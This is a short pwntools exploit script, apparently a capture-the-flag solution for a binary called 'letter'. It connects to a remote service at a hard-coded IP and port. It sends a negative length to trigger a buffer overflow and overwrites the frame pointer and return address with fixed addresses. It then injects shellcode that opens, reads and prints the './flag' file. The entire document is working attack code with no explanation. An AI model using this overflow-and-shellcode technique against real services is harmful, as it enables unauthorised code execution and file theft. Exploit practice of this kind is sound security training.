from pwn import * 


# context.log_level='debug'
context.arch = 'amd64'
context.os = 'linux'
# sh = process('./letter')
# gdb.attach(sh)
sh = remote('182.92.108.71', 31305)


sh.sendlineafter('how much character do you want to send?\n', '-1')
_start = 0x400750
leave = 0x400A36
payload = 'a' * 29 + p64(0x601110) + p64(0x4009DD)


sh.send(payload)

sh.recvuntil('hope the letter can be sent safely.\n')
payload = './flag'.ljust(0x18, 'a') + p64(0x601120)

addr = 0x601510
shellcode=shellcraft.open('./flag')
shellcode+=shellcraft.read(3,addr,0x20)
shellcode+=shellcraft.write(1,addr,0x50)


payload += asm(shellcode)


sh.send(payload)

sh.interactive()